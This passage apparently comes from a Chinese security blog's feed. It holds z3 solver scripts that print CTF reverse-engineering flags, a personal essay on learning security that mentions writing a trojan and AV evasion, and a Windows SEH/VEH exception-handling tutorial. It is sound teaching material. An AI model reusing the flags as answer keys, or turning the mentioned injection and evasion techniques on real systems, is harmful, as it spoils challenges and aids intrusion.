class="hljs-number">205675</span> * key[<span class="hljs-number">20</span>]+ <span class="hljs-number">197685</span> * key[<span class="hljs-number">1</span>]+ <span class="hljs-number">144870</span> * key[<span class="hljs-number">4</span>]+ <span class="hljs-number">120347</span> * key[<span class="hljs-number">10</span>]+ <span class="hljs-number">202621</span> * key[<span class="hljs-number">14</span>]+ -<span class="hljs-number">236806</span> * key[<span class="hljs-number">17</span>]+ <span class="hljs-number">268813</span> * key[<span class="hljs-number">3</span>]+ <span class="hljs-number">191822</span> * key[<span class="hljs-number">23</span>]+ -<span class="hljs-number">40848</span> * key[<span class="hljs-number">6</span>]+ <span class="hljs-number">103466</span> * key[<span class="hljs-number">7</span>]+ -<span class="hljs-number">211930</span> * key[<span class="hljs-number">5</span>]+ -<span class="hljs-number">180522</span> * key[<span class="hljs-number">19</span>]+ -<span class="hljs-number">188959</span> * key[<span class="hljs-number">15</span>]+ -<span class="hljs-number">238839</span> * key[<span class="hljs-number">21</span>]+ <span class="hljs-number">281705</span> * key[<span class="hljs-number">11</span>]+ <span class="hljs-number">175825</span> * key[<span class="hljs-number">16</span>]+ -<span class="hljs-number">44618</span> * key[<span class="hljs-number">12</span>]+ <span class="hljs-number">196370</span> * key[<span class="hljs-number">0</span>]+ <span class="hljs-number">89330</span> * key[<span class="hljs-number">22</span>]+ -<span class="hljs-number">133696</span> * key[<span class="hljs-number">8</span>]+ -<span class="hljs-number">60213</span> * key[<span class="hljs-number">2</span>]+ <span class="hljs-number">191404</span> * key[<span class="hljs-number">18</span>]- <span class="hljs-number">291063</span> * key[<span class="hljs-number">9</span>]+ <span class="hljs-number">13902</span> * key[<span class="hljs-number">13</span>] == <span class="hljs-number">67763764</span> )<br>s.add( <span class="hljs-number">69341</span> * key[<span class="hljs-number">15</span>]+ -<span class="hljs-number">19740</span> * key[<span class="hljs-number">21</span>]+ <span class="hljs-number">62004</span> * key[<span class="hljs-number">10</span>]+ <span class="hljs-number">29334</span> * key[<span class="hljs-number">8</span>]+ -<span class="hljs-number">78459</span> * key[<span class="hljs-number">1</span>]+ -<span class="hljs-number">261617</span> * key[<span class="hljs-number">3</span>]+ <span class="hljs-number">115716</span> * key[<span class="hljs-number">22</span>]+ <span class="hljs-number">7838</span> * key[<span class="hljs-number">16</span>]+ -<span class="hljs-number">173902</span> * key[<span class="hljs-number">14</span>]+ <span class="hljs-number">115189</span> * key[<span class="hljs-number">9</span>]+ <span class="hljs-number">234832</span> * key[<span class="hljs-number">7</span>]+ -<span class="hljs-number">54321</span> * key[<span class="hljs-number">5</span>]+ -<span class="hljs-number">268221</span> * key[<span class="hljs-number">20</span>]+ -<span class="hljs-number">210563</span> * key[<span class="hljs-number">18</span>]+ -<span class="hljs-number">161113</span> * key[<span class="hljs-number">13</span>]+ -<span class="hljs-number">199130</span> * key[<span class="hljs-number">23</span>]+ -<span class="hljs-number">94067</span> * key[<span class="hljs-number">24</span>]+ <span class="hljs-number">9601</span> * key[<span class="hljs-number">11</span>]+ -<span class="hljs-number">8509</span> * key[<span class="hljs-number">12</span>]+ <span class="hljs-number">14439</span> * key[<span class="hljs-number">2</span>]+ -<span class="hljs-number">243227</span> * key[<span class="hljs-number">19</span>]+ <span class="hljs-number">37665</span> * key[<span class="hljs-number">17</span>]+ <span class="hljs-number">91076</span> * key[<span class="hljs-number">6</span>]- <span class="hljs-number">85246</span> * key[<span class="hljs-number">0</span>]+ <span class="hljs-number">39558</span> * key[<span class="hljs-number">4</span>] == -<span class="hljs-number">98330271</span> )<br>s.add( <span class="hljs-number">38468</span> * key[<span class="hljs-number">19</span>]+ -<span class="hljs-number">75568</span> * key[<span class="hljs-number">2</span>]+ <span class="hljs-number">169299</span> * key[<span class="hljs-number">22</span>]+ -<span class="hljs-number">252915</span> * key[<span class="hljs-number">3</span>]+ <span class="hljs-number">32044</span> * key[<span class="hljs-number">24</span>]+ -<span class="hljs-number">260264</span> * key[<span class="hljs-number">8</span>]+ -<span class="hljs-number">111200</span> * key[<span class="hljs-number">1</span>]+ -<span class="hljs-number">78437</span> * key[<span class="hljs-number">20</span>]+ -<span class="hljs-number">212633</span> * key[<span class="hljs-number">16</span>]+ <span class="hljs-number">180400</span> * key[<span class="hljs-number">5</span>]+ -<span class="hljs-number">81477</span> * key[<span class="hljs-number">12</span>]+ <span class="hljs-number">232645</span> * key[<span class="hljs-number">0</span>]+ -<span class="hljs-number">65268</span> * key[<span class="hljs-number">4</span>]+ <span class="hljs-number">263000</span> * key[<span class="hljs-number">6</span>]+ <span class="hljs-number">247654</span> * key[<span class="hljs-number">25</span>]+ -<span class="hljs-number">242059</span> * key[<span class="hljs-number">17</span>]+ -<span class="hljs-number">35931</span> * key[<span class="hljs-number">9</span>]+ -<span class="hljs-number">271816</span> * key[<span class="hljs-number">21</span>]+ <span class="hljs-number">10191</span> * key[<span class="hljs-number">13</span>]+ <span class="hljs-number">41768</span> * key[<span class="hljs-number">23</span>]+ <span class="hljs-number">92844</span> * key[<span class="hljs-number">7</span>]+ -<span class="hljs-number">73366</span> * key[<span class="hljs-number">14</span>]+ -<span class="hljs-number">124307</span> * key[<span class="hljs-number">10</span>]+ <span class="hljs-number">197710</span> * key[<span class="hljs-number">18</span>]+ <span class="hljs-number">226192</span> * key[<span class="hljs-number">15</span>]+ <span class="hljs-number">3788</span> * key[<span class="hljs-number">11</span>] == -<span class="hljs-number">13464859</span> )<br>s.add( -<span class="hljs-number">23897</span> * key[<span class="hljs-number">9</span>]+ -<span class="hljs-number">188087</span> * key[<span class="hljs-number">24</span>]+ -<span class="hljs-number">254282</span> * key[<span class="hljs-number">15</span>]+ -<span class="hljs-number">102361</span> * key[<span class="hljs-number">23</span>]+ -<span class="hljs-number">15606</span> * key[<span class="hljs-number">14</span>]+ -<span class="hljs-number">74795</span> * key[<span class="hljs-number">21</span>]+ <span class="hljs-number">116581</span> * key[<span class="hljs-number">12</span>]+ <span class="hljs-number">77693</span> * key[<span class="hljs-number">5</span>]+ -<span class="hljs-number">6866</span> * key[<span class="hljs-number">25</span>]+ <span class="hljs-number">215574</span> * key[<span class="hljs-number">22</span>]+ <span class="hljs-number">231326</span> * key[<span class="hljs-number">6</span>]+ <span class="hljs-number">77915</span> * key[<span class="hljs-number">2</span>]+ <span class="hljs-number">186585</span> * key[<span class="hljs-number">3</span>]+ <span class="hljs-number">219151</span> * key[<span class="hljs-number">4</span>]+ <span class="hljs-number">271210</span> * key[<span class="hljs-number">13</span>]+ -<span class="hljs-number">78913</span> * key[<span class="hljs-number">20</span>]+ <span class="hljs-number">83918</span> * key[<span class="hljs-number">8</span>]+ -<span class="hljs-number">153409</span> * key[<span class="hljs-number">18</span>]+ -<span class="hljs-number">84952</span> * key[<span class="hljs-number">7</span>]+ -<span class="hljs-number">121854</span> * key[<span class="hljs-number">0</span>]+ -<span class="hljs-number">253617</span> * key[<span class="hljs-number">26</span>]+ -<span class="hljs-number">213665</span> * key[<span class="hljs-number">19</span>]+ -<span class="hljs-number">293146</span> * key[<span class="hljs-number">17</span>]+ -<span class="hljs-number">166693</span> * key[<span class="hljs-number">16</span>]+ -<span class="hljs-number">206964</span> * key[<span class="hljs-number">1</span>]- <span class="hljs-number">155664</span> * key[<span class="hljs-number">10</span>]+ <span class="hljs-number">180598</span> * key[<span class="hljs-number">11</span>] == -<span class="hljs-number">55504393</span> )<br>s.add( <span class="hljs-number">264405</span> * key[<span class="hljs-number">11</span>]+ <span class="hljs-number">135302</span> * key[<span class="hljs-number">12</span>]+ <span class="hljs-number">278196</span> * key[<span class="hljs-number">9</span>]+ -<span class="hljs-number">132906</span> * key[<span class="hljs-number">23</span>]+ <span class="hljs-number">138308</span> * key[<span class="hljs-number">7</span>]+ <span class="hljs-number">40423</span> * key[<span class="hljs-number">21</span>]+ <span class="hljs-number">157781</span> * key[<span class="hljs-number">0</span>]+ -<span class="hljs-number">38949</span> * key[<span class="hljs-number">27</span>]+ -<span class="hljs-number">143324</span> * key[<span class="hljs-number">14</span>]+ -<span class="hljs-number">120743</span> * key[<span class="hljs-number">10</span>]+ <span class="hljs-number">77375</span> * key[<span class="hljs-number">5</span>]+ -<span class="hljs-number">164339</span> * key[<span class="hljs-number">3</span>]+ <span class="hljs-number">167370</span> * key[<span class="hljs-number">25</span>]+ -<span class="hljs-number">225830</span> * key[<span class="hljs-number">4</span>]+ -<span class="hljs-number">136952</span> * key[<span class="hljs-number">2</span>]+ -<span class="hljs-number">14347</span> * key[<span class="hljs-number">8</span>]+ <span class="hljs-number">6966</span> * key[<span class="hljs-number">26</span>]+ <span class="hljs-number">88628</span> * key[<span class="hljs-number">18</span>]+ <span class="hljs-number">138998</span> * key[<span class="hljs-number">22</span>]+ <span class="hljs-number">147747</span> * key[<span class="hljs-number">19</span>]+ -<span class="hljs-number">106792</span> * key[<span class="hljs-number">6</span>]+ -<span class="hljs-number">113009</span> * key[<span class="hljs-number">20</span>]+ <span class="hljs-number">98136</span> * key[<span class="hljs-number">15</span>]+ <span class="hljs-number">231264</span> * key[<span class="hljs-number">24</span>]+ -<span class="hljs-number">109447</span> * key[<span class="hljs-number">17</span>]+ <span class="hljs-number">258890</span> * key[<span class="hljs-number">1</span>]+ <span class="hljs-number">167885</span> * key[<span class="hljs-number">16</span>]+ <span class="hljs-number">246315</span> * key[<span class="hljs-number">13</span>] == <span class="hljs-number">133068723</span> )<br><br><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">if</span> s.check() == sat:<br>    result = s.model()<br>    <span class="hljs-built_in">print</span> s.model()<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">28</span>):<br>        flag += <span class="hljs-built_in">chr</span>(result[key[i]].as_long().real)<br>    <span class="hljs-built_in">print</span> flag<br>    <span class="hljs-built_in">print</span> <span class="hljs-built_in">len</span>(<span class="hljs-string">&#x27;flag&#123;g0_Fuck_xx_5egm3nt&#x27;</span>)<br></code></pre></td></tr></table></figure><h2 id="imitation-game"><a href="#imitation-game" class="headerlink" title="imitation_game"></a>imitation_game</h2><p><img src="image-20200825143930854.png" alt="image-20200825143930854"></p><p>开头一个aes</p><p>后面提示chip8，google工具redasm直接反编译能看出大致逻辑</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: UTF-8 -*-</span><br><span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *<br>s = Solver()<br>key = [BitVec(<span class="hljs-string">&#x27;%d&#x27;</span>%i,<span class="hljs-number">8</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>)]<br><br>s.add(key[<span class="hljs-number">0</span>]+<span class="hljs-number">2</span>*key[<span class="hljs-number">1</span>]+key[<span class="hljs-number">2</span>] == <span class="hljs-number">0x37</span>)<br>s.add(<span class="hljs-number">2</span>*key[<span class="hljs-number">0</span>]+key[<span class="hljs-number">1</span>]+key[<span class="hljs-number">2</span>] == <span class="hljs-number">0x37</span>)<br>s.add(key[<span class="hljs-number">0</span>]+<span class="hljs-number">2</span>*key[<span class="hljs-number">1</span>]+<span class="hljs-number">2</span>*key[<span class="hljs-number">2</span>] == <span class="hljs-number">0x3b</span>)<br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">if</span> s.check() == sat:<br>    <span class="hljs-built_in">print</span> s.model()<br>aaa = [<span class="hljs-number">10</span>,<span class="hljs-number">2</span>,<span class="hljs-number">13</span>,<span class="hljs-number">14</span>,<span class="hljs-number">15</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">12</span>,<span class="hljs-number">1</span>,<span class="hljs-number">3</span>]<br>flag = <span class="hljs-string">&#x27;flag&#123;6c8f1d78770fe672122478c6f9a150e6&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(aaa)):<br>    flag += <span class="hljs-built_in">str</span>(<span class="hljs-built_in">hex</span>(aaa[i]).replace(<span class="hljs-string">&#x27;0x&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>))<br>flag += <span class="hljs-string">&#x27;&#125;&#x27;</span><br><span class="hljs-built_in">print</span> flag<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>给大二画上一个完美的句号</title>
    <link href="/2020/08/22/%E7%BB%99%E5%A4%A7%E4%BA%8C%E7%94%BB%E4%B8%8A%E4%B8%80%E4%B8%AA%E5%AE%8C%E7%BE%8E%E7%9A%84%E5%8F%A5%E5%8F%B7/"/>
    <url>/2020/08/22/%E7%BB%99%E5%A4%A7%E4%BA%8C%E7%94%BB%E4%B8%8A%E4%B8%80%E4%B8%AA%E5%AE%8C%E7%BE%8E%E7%9A%84%E5%8F%A5%E5%8F%B7/</url>
    
    <content type="html"><![CDATA[<p>一些牢骚</p><p>学了俩年，多少有点收获</p><a id="more"></a><h1 id="入门"><a href="#入门" class="headerlink" title="入门"></a>入门</h1><p>介绍下个人情况:</p><p>1.南邮18级，零基础</p><p>2.大一开学被ctf吸引，决心要学习安全</p><p>这应该和大部分新生一样，当时也不知道怎么学，就只能像学长请教，天天缠着学长问问题，军训那一个月不到时间内学完c语言，当时也是听了学长的观点，好好学了指针，学完就开始刷题，国庆第一次接触了re，南邮招新群第一道题目，就一个明文比较看了四小时没有看明白，ida也不会用(当时用的6.8，7.0还没泄露，如果7.0应该能直接识别出字符串了，6.8只能把他识别成字符数组)当时就是纠结了这个该死的“小端序”，硬是磕了半天，意识到自己还有所欠缺，继续学了汇编（王爽老师的汇编语言）学完后勉强能看懂了，刷了3题（南邮第一题，第二题纯汇编和maze）就开始打校赛，说是组队吧。。。其实就一人在那写题，勉强写出了3题，混了个三等奖。</p><p>就这样渐渐有了学习方向，每天学习就是刷题，总结，写wp，不断重复。到了大一寒假已经可以说是”入门”ctf了（常见的技术，smc，junk code等都基本掌握）</p><h1 id="愚昧山峰"><a href="#愚昧山峰" class="headerlink" title="愚昧山峰"></a>愚昧山峰</h1><p>有了这些基础必然是开始比赛，每天除了刷题就是比赛，第一个一等奖记得是东南大学的校赛(当时算省赛的)，5个re抢了4一血，有点飘。原来这就是ctf吗？后来也通过了面试加入了x1c，一切都是那么的顺利，暑假期间也打了臭名昭著的hape比赛(iscc，亏他还是我打的第一个国家级比赛)</p><p>可能这和标题描述的有所不符，为什么是愚昧山峰？</p><p>因为我当时认为，这就是”安全”，ctf就是全部，每天干着同样的事，刷题，总结，写wp，刚开始还有些许新鲜感，后来逐渐变乏味起来，没有什么新知识，题目老套没意思。</p><p>没错，大二上就这么过过来的，不断地比赛，拿一堆质量不怎么高的比赛的奖，刷题，写wp</p><h1 id="绝望之谷"><a href="#绝望之谷" class="headerlink" title="绝望之谷"></a>绝望之谷</h1><p>纸终究包不住火，大二寒假遇上疫情没什么事干，学长就帮忙内推了腾讯，当时面的是游戏安全(没错，当时我都没怎么接触游戏安全一下就面腾讯的游戏安全，也不知道哪来的胆子)，一面就出现很多问题，有很多常见的知识根本没有思考过本质。</p><p>心灰意冷。。。</p><p>好在腾讯的师傅都很不错，因为才大二和我说了很多，令我印象最深的一句话是”你现在学会了骑自行车，现在是你要怎么骑得有价值”然后询问了我喜欢的方向和他们目前有的岗位，这句话对我打击挺大的，不由让我思考之前都在学一些什么，ctf就是全部吗？</p><p>的确，只学会了骑自行车，什么都会一点就是什么都不会。</p><p>这边顺带说说ctf逆向，安卓逆向 windows逆向 linux逆向都算逆向，还有python，iot。。。对于刚入门的人来说写起来其实可以说是套路，你可能都不知道本质但是你就写的出，活生生一个代码观察师，而且还有些出题人自己都没怎么深入了解就xjb出题，专门出一些冷门的，然后翻车，挑一些冷门算法，可能自己都没怎么理解翻车了都不知道，就像之前某比赛一个流密码给你密文让你把key和明文整出来(key和明文有关)</p><p>种种原因让我做了个决定</p><p>1.不打ctf(指质量不高的ctf)</p><p>2.自学</p><h1 id="开悟之坡"><a href="#开悟之坡" class="headerlink" title="开悟之坡"></a>开悟之坡</h1><p>自学，从0开始的逆向学习</p><p>当时看了  C++反汇编与逆向分析技术揭秘  还有  程序员的自我修养 这俩本书，感悟挺深，但又感觉有所欠缺，便开始了深入学习</p><p>从pe开始</p><p>before:</p><p>1.谈到PE脑中就一个MZ</p><p>2.回显出PE大致结构</p><p>after:</p><p>1.自己新增节</p><p>2.自己修改entrypoint来”代码注入”</p><p>3.自己修改导入表来”dll注入”</p><p>4.自己写iat hook</p><p>5.自己写了个简单的壳子(进程替换)</p><p>所有之前感觉很高大上的东西变得轻松易懂起来</p><p>就这样，我开始不断地深入学习之前学过的每一样东西，并不断问自己，是否真正掌握了？</p><p>线程是什么，线程是怎么切换的？线程就是createthread这个函数吗？windows api是怎么调用的？</p><p>渐渐就开始接触内核，开始逆向windows(微)内核</p><p>ntoskrnl.exe</p><p>遇到不会的疯狂百度，还是当初入门ctf的套路</p><p>“不会就百度，百度不到就Google”</p><p>就像连锁反应，学了进程就得看线程，三环看完看零环，进程结构体EPROCESS线程结构体ETHREAD，缺一不可，假如你想知道windows内核是怎么切换线程，怎么根据优先级来切换，怎么找到线程在哪，就必须得知道并熟悉这些结构体里每个成员意义，就必须得自己去逆向ntoskrnl.exe，毕竟我们这种搞安全的研究的是底层。</p><p>诸如此类，花了2个月，学完大致对内核有所了解，基本的内核结构体都见过。自己也动手写了些小东西，比如第一个内核hook(x64 pg很头大，但是这边忽视，就是学习)，各种注入，也正是这些基础让我在实习时有点”用武之地”(当时在长亭科技，本来是不准备实习了，和南航大哥聊天时偶尔提及变零时改变主意)，组长让我帮忙写个马，虽然我做的一些工作可能组长半天就能整完，但还是能成长许多，知道主流木马是怎么个思路，怎么免杀等等。//顺带模仿组长的木马思路自己也写了个</p><h2 id="有什么用？"><a href="#有什么用？" class="headerlink" title="有什么用？"></a>有什么用？</h2><p>离职后又重新翻了波 程序员的自我修养</p><p>不同时期看同一本书感觉还是很大，第一次看时感觉就那样，大部分一扫而过感觉都了解过，甚至感觉有点”浪费时间”。</p><p>学完一些内核基础再看这本书，体验截然相反</p><p>所以说这本书被那么多业内大佬吹捧，讲的很多，但又没涉及太多内核，能给程序员一个大概</p><p>正好国赛打完，有个永恒之蓝的勒索病毒逆向，虽然放在misc里但是是个逆向，里面对导入表的操作，dll里的inline hook</p><p>听大哥说很多病毒都有这种操作(没搞过病毒逆向，本来准备复习一波pwn的，但这成功引起了我的注意)</p><p>如果换在以前，可能不会去在意这些，分析算法写出题目就完事了</p><p>现在会去仔细分析，逆向编程了解他是如何实现。</p><p>而这正是因为有了之前所学的”基础”，大部分曾经看不懂的（或者自己以为已经懂了的）技术都能理解并实现。</p><p>有了基础，现在差的就是时间的沉淀来提升</p><p>但也有可能真没什么用，没准这又是下一个”愚昧山峰”</p><p>但愿自己所做的努力没有白费。</p><p>这篇blog纯属是一些总结</p><p>希望能对后辈有所帮助</p>]]></content>
    
    
    
    <tags>
      
      <tag>daily</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>异常处理机制</title>
    <link href="/2020/08/13/%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E6%9C%BA%E5%88%B6/"/>
    <url>/2020/08/13/%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E6%9C%BA%E5%88%B6/</url>
    
    <content type="html"><![CDATA[<p>原来对异常的理解就是seh，FS:[0]</p><p>借此机会来好好的学习下</p><a id="more"></a><h1 id="什么是异常"><a href="#什么是异常" class="headerlink" title="什么是异常"></a>什么是异常</h1><p>首先异常分为俩种，CPU产生的异常(除0，缺页)和软件模拟产生的异常</p><h2 id="CPU产生异常"><a href="#CPU产生异常" class="headerlink" title="CPU产生异常"></a>CPU产生异常</h2><p>首先CPU检测到异常-&gt;查IDT表-&gt;CommonDispatchException-&gt;KiDispatchException</p><p>CommonDispatchException构造了异常结构体如下，参数是异常类型和发生地址</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">type <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">EXCEPTION_RECORD</span></span><br><span class="hljs-class">&#123;</span><br>DWORD ExceptionCode;<span class="hljs-comment">//异常代码</span><br>DWORD ExceptionFlags;<span class="hljs-comment">//异常状态，CPU还是软件</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">EXCEPTION_RECORD</span>* <span class="hljs-title">ExceptionRecord</span>;</span><span class="hljs-comment">//下一个异常</span><br>PVOID ExceptionAddress;<span class="hljs-comment">//异常发生地址</span><br>DWORD NumberParameters;<span class="hljs-comment">//附加参数个数</span><br>ULONG_PTR ExceptionInformation <br>[EXCEPTION_MAXIMUM_PARAMETERS];<span class="hljs-comment">//附加参数指针</span><br>&#125;  <br><br></code></pre></td></tr></table></figure><p>KiDispatchException分发异常，找到对应处理函数去处理</p><h2 id="软件模拟产生异常"><a href="#软件模拟产生异常" class="headerlink" title="软件模拟产生异常"></a>软件模拟产生异常</h2><p>一般情况下软件模拟产生异常会调用RaiseException函数来自Kernel32.dll</p><p>该函数调用ntdll.dll里的RtlRaiseException函数，然后继续往下调用NtRaiseException和KiRaiseException,最后调用KiDispatchException</p><p><img src="image-20200813174520978.png" alt="image-20200813174520978"></p><p>整体如上图所示</p><h1 id="内核层异常处理流程"><a href="#内核层异常处理流程" class="headerlink" title="内核层异常处理流程"></a>内核层异常处理流程</h1><p>首先不管是用户态异常还是内核异常，都要通过KiDispatchException函数来进行分发，所以我们主要分析该函数</p><p><img src="image-20200814214113613.png" alt="image-20200814214113613"></p><p>异常和APC很像，可以看到这边开始备份了，但是我们先分析内核如何处理所以没啥用</p><p><img src="image-20200814214329255.png" alt="image-20200814214329255"></p><p>首先判断先前模式 0是内核层1是用户层，仅接着判断是否是第一次调用，然后再看是否有内核调试器，没有或者内核调试器不处理就调用RtlDispatchException，返回false的话再次判断是否有内核调试器 有则调用，没有直接蓝屏</p><p>下面看看RtlDispatchException,这个就是我们”熟悉”的异常处理了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">EXCEPTION_REGISTRATION_RECORD</span> &#123;</span><br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">EXCEPTION_REGISTRATION_RECORD</span> *<span class="hljs-title">Next</span>;</span><br>        PEXCEPTION_ROUTINE Handler;<br>    &#125; EXCEPTION_REGISTRATION_RECORD;<br></code></pre></td></tr></table></figure><p>遍历异常链表，没错就是FS:[0]那的，调用异常处理函数，如果被处理了函数返回值为1，如果该异常处理函数不能处理则调用下一个，直到next指针为0xffffffff，如果没有函数能够处理该异常则返回0.</p><p><img src="image-20200814215131298.png" alt="image-20200814215131298"></p><p>注意这边fs并不是指向PEB，这边是内核处理，fs是kpcr，只是kpcr和peb第一个成员一样都是tib。</p><h1 id="用户层异常处理流程"><a href="#用户层异常处理流程" class="headerlink" title="用户层异常处理流程"></a>用户层异常处理流程</h1><p><img src="image-20200816132126545.png" alt="image-20200816132126545"></p><p>和内核层一样先判断是否第一次调用，然后判断内核调试器是否存在，如果没有，把异常信息发送给三环调试器，如果三环调试器没有处理或者不存在，那么就开始返回三环恢复环境</p><p><img src="image-20200816132242032.png" alt="image-20200816132242032"></p><p>返回到ntdll中的KiUserExceptionDispatcher，可以看到这边修改了eip</p><h1 id="VEH"><a href="#VEH" class="headerlink" title="VEH"></a>VEH</h1><p>向量化异常处理</p><p>关于这个得分析下_KiUserExceptionDispatcher@8</p><p><img src="image-20200816193822433.png" alt="image-20200816193822433"></p><p>调用_RtlDispatchException@8处理异常，如果处理成功则_ZwContinue@8进0环回到原来的地方</p><p>否则_ZwRaiseException@12分发第二轮异常</p><p>来看看_RtlDispatchException@8</p><p><img src="image-20200816193924188.png" alt="image-20200816193924188"></p><p>_RtlCallVectoredExceptionHandlers@8就是查找VEH链表，如果有的话就调用</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _CRT_SECURE_NO_DEPRECATE</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;tlhelp32.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">PVOID</span><span class="hljs-params">(NTAPI* FnAddVectoredExceptionHandler)</span><span class="hljs-params">(ULONG, _EXCEPTION_POINTERS*)</span></span>;<br>FnAddVectoredExceptionHandler MyAddVectoredExceptionHandler;<br><br><span class="hljs-function">LONG NTAPI <span class="hljs-title">VectExcepHandler</span><span class="hljs-params">(PEXCEPTION_POINTERS pExcepInfo)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">if</span> (pExcepInfo-&gt;ExceptionRecord-&gt;ExceptionCode == <span class="hljs-number">0xC0000094</span>)<span class="hljs-comment">//除0异常</span><br>&#123;<br><span class="hljs-comment">//将除数修改为2</span><br>pExcepInfo-&gt;ContextRecord-&gt;Ecx = <span class="hljs-number">2</span>;<br><span class="hljs-comment">//或者修改发生异常的代码的Eip    idiv ecx长度2字节 从下一行开始执行</span><br><span class="hljs-comment">//pExcepInfo-&gt;ContextRecord-&gt;Eip = pExcepInfo-&gt;ContextRecord-&gt;Eip + 2;</span><br><span class="hljs-keyword">return</span> EXCEPTION_CONTINUE_EXECUTION;<span class="hljs-comment">//已处理</span><br>&#125;<br><span class="hljs-keyword">return</span> EXCEPTION_CONTINUE_SEARCH;<span class="hljs-comment">//未处理</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>HMODULE hModule = GetModuleHandle(<span class="hljs-string">L&quot;Kernel32.dll&quot;</span>);<br>MyAddVectoredExceptionHandler = (FnAddVectoredExceptionHandler)::GetProcAddress(hModule, <span class="hljs-string">&quot;AddVectoredExceptionHandler&quot;</span>);<br><span class="hljs-comment">//参数1表示插入VEH链的头部, 0插入到VEH链的尾部</span><br>MyAddVectoredExceptionHandler(<span class="hljs-number">0</span>, (_EXCEPTION_POINTERS*)&amp;VectExcepHandler);<br><span class="hljs-comment">//构造除0异常</span><br><span class="hljs-keyword">int</span> val = <span class="hljs-number">0</span>;<br>_asm<br>&#123;<br><span class="hljs-keyword">xor</span> edx, edx<br><span class="hljs-keyword">xor</span> ecx, ecx<br>mov eax, <span class="hljs-number">100</span><br>idiv ecx<br>mov val, eax<span class="hljs-comment">//结果在eax</span><br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;val = %d\n&quot;</span>, val);<br>getchar();<br>&#125;<br><br></code></pre></td></tr></table></figure><p>可见上面示例代码，除零异常处理</p><p><img src="image-20200816194630333.png" alt="image-20200816194630333"></p><p>修改了ecx为2后发现是50</p><h1 id="SEH"><a href="#SEH" class="headerlink" title="SEH"></a>SEH</h1><p>SEH就是平时所熟知得结构化异常处理了，CTF中很常见</p><p>首先是处理VEH没有的话则SEH，见_RtlpGetStackLimits@8</p><p><img src="image-20200816194859195.png" alt="image-20200816194859195"></p><p>检测SEH结构是否在堆栈中</p><p>继续看_RtlpGetRegistrationHead@0</p><p><img src="image-20200816194957384.png" alt="image-20200816194957384"></p><p>把异常处理链表头取出</p><p><img src="image-20200816195127156.png" alt="image-20200816195127156"></p><p><img src="image-20200816195411363.png" 